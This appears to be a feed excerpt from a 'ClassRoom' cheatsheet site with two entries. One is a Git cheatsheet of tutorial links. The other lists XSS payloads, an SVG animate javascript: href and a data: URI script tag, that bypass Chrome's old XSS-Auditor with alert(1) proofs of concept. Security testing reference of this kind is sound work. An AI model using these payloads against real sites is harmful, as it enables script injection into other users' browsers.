channel.title: cheatsheet on ClassRoom
channel.description: Recent content in cheatsheet on ClassRoom

item.title: Xss Bypassfilter
item.description: XSS Chrome XSS-Auditor Bypass by @vivekchsm <svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a> Chrome < v60 beta XSS-Auditor Bypass <script src="data:,alert(1)%250A--> Other Chrome XSS-Auditor Bypasses

item.title: Git Cheatsheet
item.description: Global Settings Related Setup: https://gist.github.com/hofmannsven/6814278 Related Pro Tips: https://ochronus.com/git-tips-from-the-trenches/ Interactive Beginners Tutorial: http://try.github.io/ Git Cheatsheet by GitHub: https://services.github.com/on-demand/downloads/github-git-cheat-sheet/ Reminder Press minus + shift + s and return to chop/fold long lines!
